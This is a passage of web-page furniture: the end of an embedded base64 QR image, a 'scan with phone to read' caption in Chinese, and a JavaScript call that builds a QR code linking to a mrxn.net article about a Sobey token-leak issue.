NxGl2XLXXZ16+Qn2Q0wFB/eY7QnwrHfZvd3+3F6S3dSKMOoS7Bhh51+2j3nGWPw2kF9387+7ANhDItOE5/tfleSrEV/v9jh/yM/Te9hDNd64uwvN++uwjqsNYD+EQ1Fe4DaTIHe/fgXsg75/BsIL/AQAA///gx11HAAAABklEQVQDABgWZ7Yz2iAFAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-thirdPlatToto-getUserBindUrl-token-leak.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 